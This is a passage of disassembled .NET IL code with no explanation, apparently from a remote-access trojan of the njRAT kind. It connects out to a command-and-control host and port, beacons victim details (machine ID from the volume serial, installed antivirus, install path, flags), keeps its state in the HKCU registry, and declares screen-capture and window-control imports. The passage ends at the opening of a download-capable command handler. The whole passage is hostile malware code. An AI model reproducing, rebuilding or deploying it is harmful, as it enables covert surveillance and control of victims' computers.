        IL_00d6:  ldloc.s    V_6
        IL_00d8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00dd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00e7:  leave.s    IL_00e9

      }  // end handler
      IL_00e9:  nop
      .try
      {
        IL_00ea:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_00ef:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
        IL_00f4:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_00f9:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00fe:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0103:  ldc.i4     0x32000
        IL_0108:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_010d:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0112:  ldc.i4     0x32000
        IL_0117:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_011c:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0121:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0126:  ldc.i4     0x2710
        IL_012b:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_0130:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0135:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_013a:  ldc.i4     0x2710
        IL_013f:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_0144:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0149:  ldsfld     string j.OK::H
        IL_014e:  ldsfld     string j.OK::P
        IL_0153:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_0158:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_015d:  ldc.i4.1
        IL_015e:  stsfld     bool j.OK::Cn
        IL_0163:  call       string j.OK::inf()
        IL_0168:  call       bool j.OK::Send(string)
        IL_016d:  pop
        .try
        {
          IL_016e:  ldstr      "vn"
          IL_0173:  ldstr      ""
          IL_0178:  call       object j.OK::GTV(string,
                                                object)
          IL_017d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_0182:  ldstr      ""
          IL_0187:  ldc.i4.0
          IL_0188:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_018d:  brfalse.s  IL_01a9

          IL_018f:  ldloc.s    V_7
          IL_0191:  ldsflda    string j.OK::VN
          IL_0196:  call       string j.OK::DEB(string&)
          IL_019b:  ldstr      "\r\n"
          IL_01a0:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01a5:  stloc.s    V_7
          IL_01a7:  br.s       IL_01d9

          IL_01a9:  ldloc.s    V_7
          IL_01ab:  ldstr      "vn"
          IL_01b0:  ldstr      ""
          IL_01b5:  call       object j.OK::GTV(string,
                                                object)
          IL_01ba:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_01bf:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_01c4:  stloc.s    V_8
          IL_01c6:  ldloca.s   V_8
          IL_01c8:  call       string j.OK::DEB(string&)
          IL_01cd:  ldstr      "\r\n"
          IL_01d2:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01d7:  stloc.s    V_7
          IL_01d9:  ldc.i4.s   16
          IL_01db:  newarr     [mscorlib]System.String
          IL_01e0:  dup
          IL_01e1:  ldc.i4.0
          IL_01e2:  ldloc.s    V_7
          IL_01e4:  stelem.ref
          IL_01e5:  dup
          IL_01e6:  ldc.i4.1
          IL_01e7:  ldsfld     string j.OK::H
          IL_01ec:  stelem.ref
          IL_01ed:  dup
          IL_01ee:  ldc.i4.2
          IL_01ef:  ldstr      ":"
          IL_01f4:  stelem.ref
          IL_01f5:  dup
          IL_01f6:  ldc.i4.3
          IL_01f7:  ldsfld     string j.OK::P
          IL_01fc:  stelem.ref
          IL_01fd:  dup
          IL_01fe:  ldc.i4.4
          IL_01ff:  ldstr      "\r\n"
          IL_0204:  stelem.ref
          IL_0205:  dup
          IL_0206:  ldc.i4.5
          IL_0207:  ldsfld     string j.OK::DR
          IL_020c:  stelem.ref
          IL_020d:  dup
          IL_020e:  ldc.i4.6
          IL_020f:  ldstr      "\r\n"
          IL_0214:  stelem.ref
          IL_0215:  dup
          IL_0216:  ldc.i4.7
          IL_0217:  ldsfld     string j.OK::EXE
          IL_021c:  stelem.ref
          IL_021d:  dup
          IL_021e:  ldc.i4.8
          IL_021f:  ldstr      "\r\n"
          IL_0224:  stelem.ref
          IL_0225:  dup
          IL_0226:  ldc.i4.s   9
          IL_0228:  ldsfld     bool j.OK::Idr
          IL_022d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0232:  stelem.ref
          IL_0233:  dup
          IL_0234:  ldc.i4.s   10
          IL_0236:  ldstr      "\r\n"
          IL_023b:  stelem.ref
          IL_023c:  dup
          IL_023d:  ldc.i4.s   11
          IL_023f:  ldsfld     bool j.OK::IsF
          IL_0244:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0249:  stelem.ref
          IL_024a:  dup
          IL_024b:  ldc.i4.s   12
          IL_024d:  ldstr      "\r\n"
          IL_0252:  stelem.ref
          IL_0253:  dup
          IL_0254:  ldc.i4.s   13
          IL_0256:  ldsfld     bool j.OK::Isu
          IL_025b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0260:  stelem.ref
          IL_0261:  dup
          IL_0262:  ldc.i4.s   14
          IL_0264:  ldstr      "\r\n"
          IL_0269:  stelem.ref
          IL_026a:  dup
          IL_026b:  ldc.i4.s   15
          IL_026d:  ldsfld     bool j.OK::BD
          IL_0272:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0277:  stelem.ref
          IL_0278:  call       string [mscorlib]System.String::Concat(string[])
          IL_027d:  stloc.s    V_7
          IL_027f:  ldstr      "inf"
          IL_0284:  ldsfld     string j.OK::Y
          IL_0289:  ldloca.s   V_7
          IL_028b:  call       string j.OK::ENB(string&)
          IL_0290:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0295:  call       bool j.OK::Send(string)
          IL_029a:  pop
          IL_029b:  leave.s    IL_02b8

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_029d:  dup
          IL_029e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_02a3:  stloc.s    V_9
          IL_02a5:  ldloc.s    V_9
          IL_02a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_02ac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_02b1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_02b6:  leave.s    IL_02b8

        }  // end handler
        IL_02b8:  leave.s    IL_02e2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02ba:  dup
        IL_02bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02c0:  stloc.s    V_10
        IL_02c2:  ldloc.s    V_10
        IL_02c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02c9:  ldc.i4.0
        IL_02ca:  stsfld     bool j.OK::Cn
        IL_02cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02d9:  leave.s    IL_02e2

      }  // end handler
    }  // end .try
    finally
    {
      IL_02db:  ldloc.3
      IL_02dc:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_02e1:  endfinally
    }  // end handler
    IL_02e2:  ldsfld     bool j.OK::Cn
    IL_02e7:  ret
  } // end of method OK::connect

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (uint8[] V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldind.ref
    IL_0002:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0007:  stloc.0
    IL_0008:  ldloca.s   V_0
    IL_000a:  call       string j.OK::BS(uint8[]&)
    IL_000f:  ret
  } // end of method OK::DEB

  .method public static void  DLV(string n) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  ldc.i4.1
      IL_001f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0024:  ldarg.0
      IL_0025:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002a:  leave.s    IL_0045

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.0
      IL_0033:  ldloc.0
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0039:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0043:  leave.s    IL_0045

    }  // end handler
    IL_0045:  ret
  } // end of method OK::DLV

  .method public static void  ED() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  call       void j.OK::pr(int32)
    IL_0006:  ret
  } // end of method OK::ED

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       uint8[] j.OK::SB(string&)
    IL_0006:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000b:  ret
  } // end of method OK::ENB

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static string  GetAntiVirus() cil managed
  {
    // Code size       326 (0x146)
    .maxstack  7
    .locals init (string V_0,
             int32 V_1,
             int32 V_2,
             int32 V_3,
             object V_4,
             object V_5,
             object[] V_6,
             bool[] V_7,
             object V_8,
             class [mscorlib]System.Collections.IEnumerator V_9,
             object V_10,
             int32 V_11,
             class [mscorlib]System.Exception V_12)
    .try
    {
      IL_0000:  ldc.i4.1
      IL_0001:  stloc.3
      IL_0002:  ldstr      "Select * From AntiVirusProduct"
      IL_0007:  stloc.s    V_4
      IL_0009:  ldc.i4.2
      IL_000a:  stloc.3
      IL_000b:  ldstr      "winmgmts:\\\\.\\root\\SecurityCenter2"
      IL_0010:  ldnull
      IL_0011:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::GetObject(string,
                                                                                                      string)
      IL_0016:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_001b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0020:  stloc.s    V_5
      IL_0022:  ldc.i4.3
      IL_0023:  stloc.3
      IL_0024:  ldc.i4.1
      IL_0025:  newarr     [mscorlib]System.Object
      IL_002a:  dup
      IL_002b:  ldc.i4.0
      IL_002c:  ldloc.s    V_4
      IL_002e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0033:  stelem.ref
      IL_0034:  stloc.s    V_6
      IL_0036:  ldc.i4.1
      IL_0037:  newarr     [mscorlib]System.Boolean
      IL_003c:  dup
      IL_003d:  ldc.i4.0
      IL_003e:  ldc.i4.1
      IL_003f:  stelem.i1
      IL_0040:  stloc.s    V_7
      IL_0042:  ldloc.s    V_7
      IL_0044:  ldc.i4.0
      IL_0045:  ldelem.u1
      IL_0046:  brfalse.s  IL_0058

      IL_0048:  ldloc.s    V_6
      IL_004a:  ldc.i4.0
      IL_004b:  ldelem.ref
      IL_004c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0051:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0056:  stloc.s    V_4
      IL_0058:  ldloc.s    V_5
      IL_005a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_005f:  ldnull
      IL_0060:  ldstr      "ExecQuery"
      IL_0065:  ldloc.s    V_6
      IL_0067:  ldnull
      IL_0068:  ldnull
      IL_0069:  ldloc.s    V_7
      IL_006b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0070:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0075:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_007a:  stloc.s    V_8
      IL_007c:  ldc.i4.4
      IL_007d:  stloc.3
      IL_007e:  ldloc.s    V_8
      IL_0080:  castclass  [mscorlib]System.Collections.IEnumerable
      IL_0085:  callvirt   instance class [mscorlib]System.Collections.IEnumerator [mscorlib]System.Collections.IEnumerable::GetEnumerator()
      IL_008a:  stloc.s    V_9
      IL_008c:  br.s       IL_00ca

      IL_008e:  ldloc.s    V_9
      IL_0090:  callvirt   instance object [mscorlib]System.Collections.IEnumerator::get_Current()
      IL_0095:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_009a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_009f:  stloc.s    V_10
      IL_00a1:  ldc.i4.1
      IL_00a2:  stloc.2
      IL_00a3:  ldc.i4.6
      IL_00a4:  stloc.3
      IL_00a5:  ldloc.s    V_10
      IL_00a7:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00ac:  ldnull
      IL_00ad:  ldstr      "displayName"
      IL_00b2:  ldc.i4.0
      IL_00b3:  newarr     [mscorlib]System.Object
      IL_00b8:  ldnull
      IL_00b9:  ldnull
      IL_00ba:  ldnull
      IL_00bb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_00c0:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_00c5:  stloc.0
      IL_00c6:  leave.s    IL_0142

      IL_00c8:  ldc.i4.7
      IL_00c9:  stloc.3
      IL_00ca:  ldloc.s    V_9
      IL_00cc:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_00d1:  brtrue.s   IL_008e

      IL_00d3:  ldloc.s    V_9
      IL_00d5:  isinst     [mscorlib]System.IDisposable
      IL_00da:  brfalse.s  IL_00e8

      IL_00dc:  ldloc.s    V_9
      IL_00de:  isinst     [mscorlib]System.IDisposable
      IL_00e3:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_00e8:  ldc.i4.8
      IL_00e9:  stloc.3
      IL_00ea:  ldstr      "No AV"
      IL_00ef:  stloc.0
      IL_00f0:  leave.s    IL_0142

      IL_00f2:  ldc.i4.0
      IL_00f3:  stloc.1
      IL_00f4:  ldloc.1
      IL_00f5:  ldc.i4.1
      IL_00f6:  add.ovf
      IL_00f7:  stloc.s    V_11
      IL_00f9:  ldloc.s    V_11
      IL_00fb:  ldc.i4.1
      IL_00fc:  sub
      IL_00fd:  switch     ( 
                            IL_0000,
                            IL_0009,
                            IL_0022,
                            IL_007c,
                            IL_00a1,
                            IL_00a3,
                            IL_00c8,
                            IL_00e8,
                            IL_0126)
      IL_0126:  leave.s    IL_0142

      IL_0128:  ldloc.3
      IL_0129:  stloc.1
      IL_012a:  ldloc.2
      IL_012b:  brfalse.s  IL_0131

      IL_012d:  ldloc.2
      IL_012e:  ldc.i4.1
      IL_012f:  beq.s      IL_00f2

      IL_0131:  leave.s    IL_0142

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0133:  dup
      IL_0134:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0139:  stloc.s    V_12
      IL_013b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0140:  leave.s    IL_0128

    }  // end handler
    IL_0142:  ldloc.1
    IL_0143:  pop
    IL_0144:  ldloc.0
    IL_0145:  ret
  } // end of method OK::GetAntiVirus

  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" lasterr winapi) 
          native int  GetWindow(native int hWnd,
                                valuetype j.OK/GetWindow_Cmd uCmd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar winapi) 
          native int  SendMessage(native int hWnd,
                                  uint32 Msg,
                                  native int wParam,
                                  native int lParam) cil managed preservesig
  {
  }
  .method private static void  ToggleDesktopIcons() cil managed
  {
    // Code size       75 (0x4b)
    .maxstack  4
    .locals init (object V_0,
             native int V_1)
    IL_0000:  ldc.i4     0x7402
    IL_0005:  newobj     instance void [mscorlib]System.IntPtr::.ctor(int32)
    IL_000a:  box        [mscorlib]System.IntPtr
    IL_000f:  stloc.0
    IL_0010:  ldstr      "Progman"
    IL_0015:  ldstr      "Program Manager"
    IL_001a:  call       native int j.OK::FindWindow(string,
                                                     string)
    IL_001f:  ldc.i4.5
    IL_0020:  call       native int j.OK::GetWindow(native int,
                                                    valuetype j.OK/GetWindow_Cmd)
    IL_0025:  ldc.i4     0x111
    IL_002a:  ldloc.0
    IL_002b:  dup
    IL_002c:  brtrue.s   IL_003a

    IL_002e:  pop
    IL_002f:  ldloca.s   V_1
    IL_0031:  initobj    [mscorlib]System.IntPtr
    IL_0037:  ldloc.1
    IL_0038:  br.s       IL_003f

    IL_003a:  unbox.any  [mscorlib]System.IntPtr
    IL_003f:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0044:  call       native int j.OK::SendMessage(native int,
                                                      uint32,
                                                      native int,
                                                      native int)
    IL_0049:  pop
    IL_004a:  ret
  } // end of method OK::ToggleDesktopIcons

  .method public static object  GTV(string n,
                                    object 'ret') cil managed
  {
    // Code size       94 (0x5e)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_0034:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0039:  stloc.0
      IL_003a:  leave.s    IL_005c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003c:  dup
      IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0042:  stloc.1
      IL_0043:  ldloc.1
      IL_0044:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0049:  ldarg.1
      IL_004a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_004f:  stloc.0
      IL_0050:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0055:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005a:  leave.s    IL_005c

    }  // end handler
    IL_005c:  ldloc.0
    IL_005d:  ret
  } // end of method OK::GTV

  .method public static string  HWD() cil managed
  {
    // Code size       96 (0x60)
    .maxstack  8
    .locals init (string V_0,
             int32 V_1,
             string V_2,
             int32 V_3,
             int32 V_4,
             string V_5,
             string V_6,
             class [mscorlib]System.Exception V_7)
    .try
    {
      IL_0000:  ldnull
      IL_0001:  stloc.2
      IL_0002:  ldc.i4.0
      IL_0003:  stloc.3
      IL_0004:  ldc.i4.0
      IL_0005:  stloc.s    V_4
      IL_0007:  ldnull
      IL_0008:  stloc.s    V_5
      IL_000a:  ldstr      "SystemDrive"
      IL_000f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0014:  ldstr      "\\"
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  stloc.s    V_6
      IL_0020:  ldloca.s   V_6
      IL_0022:  ldloca.s   V_2
      IL_0024:  ldc.i4.0
      IL_0025:  ldloca.s   V_1
      IL_0027:  ldloca.s   V_3
      IL_0029:  ldloca.s   V_4
      IL_002b:  ldloca.s   V_5
      IL_002d:  ldc.i4.0
      IL_002e:  call       int32 j.OK::GetVolumeInformation(string&,
                                                            string&,
                                                            int32,
                                                            int32&,
                                                            int32&,
                                                            int32&,
                                                            string&,
                                                            int32)
      IL_0033:  pop
      IL_0034:  ldloc.1
      IL_0035:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003a:  stloc.0
      IL_003b:  leave.s    IL_005e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003d:  dup
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  stloc.s    V_7
      IL_0045:  ldloc.s    V_7
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  ldstr      "ERR"
      IL_0051:  stloc.0
      IL_0052:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005c:  leave.s    IL_005e

    }  // end handler
    IL_005e:  ldloc.0
    IL_005f:  ret
  } // end of method OK::HWD

  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          bool  ShowWindow(native int hwnd,
                           int32 nCmdShow) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("winmm.dll" winapi) 
          int32  mciSendString(string command,
                               string buffer,
                               int32 bufferSize,
                               native int hwndCallback) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  marshal( bool)  ReleaseDC(native int hWnd,
                                          native int hDC) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          native int  CreateSolidBrush(uint32 crColor) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("KERNEL32.DLL" winapi) 
          void  Beep(int32 freq,
                     int32 dur) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          bool  PatBlt(native int hdc,
                       int32 nXLeft,
                       int32 nYLeft,
                       int32 nWidth,
                       int32 nHeight,
                       valuetype j.OK/TernaryRasterOperations dwRop) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("gdi32.dll" nomangle unicode lasterr stdcall) 
          object  BitBlt(native int hdcDest,
                         int32 nXDest,
                         int32 nYDest,
                         int32 nWidth,
                         int32 nHeight,
                         native int hdcSrc,
                         int32 nXSrc,
                         int32 nYSrc,
                         int32 dwRop) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          bool  StretchBlt(native int hdcDest,
                           int32 nXOriginDest,
                           int32 nYOriginDest,
                           int32 nWidthDest,
                           int32 nHeightDest,
                           native int hdcSrc,
                           int32 nXOriginSrc,
                           int32 nYOriginSrc,
                           int32 nWidthSrc,
                           int32 nHeightSrc,
                           valuetype j.OK/TernaryRasterOperations dwRop) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          native int  GetDesktopWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          native int  GetWindowDC(native int hWnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32" winapi) 
          native int  SelectObject(native int hdc,
                                   native int hgdiobj) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32" winapi) 
          bool  DeleteObject(native int objectHandle) cil managed preservesig
  {
  }
  .method public static void  Ind(uint8[] b) cil managed noinlining nooptimization
  {
    // Code size       10887 (0x2a87)
    .maxstack  11
    .locals init (string[] V_0,
             uint8[] V_1,
             string V_2,
             class [System]System.Net.WebClient V_3,
             string V_4,
             uint8[] V_5,
             class [System]System.Net.WebClient V_6,
             string V_7,
             uint32 V_8,
             class [mscorlib]System.Exception V_9,
             string V_10,
             int32 V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13,
             valuetype [mscorlib]System.Guid V_14,
             class [mscorlib]System.Exception V_15,
             class [mscorlib]System.Exception V_16,
             uint8[] V_17,
             object V_18,
             class [mscorlib]System.IO.MemoryStream V_19,
             int32 V_20,
             uint8[] V_21,
             object V_22,
             int32 V_23,
             string V_24,
             valuetype [System.Drawing]System.Drawing.Rectangle V_25,
             class [System.Drawing]System.Drawing.Bitmap V_26,
             class [System.Drawing]System.Drawing.Graphics V_27,
             valuetype [System.Drawing]System.Drawing.Size V_28,
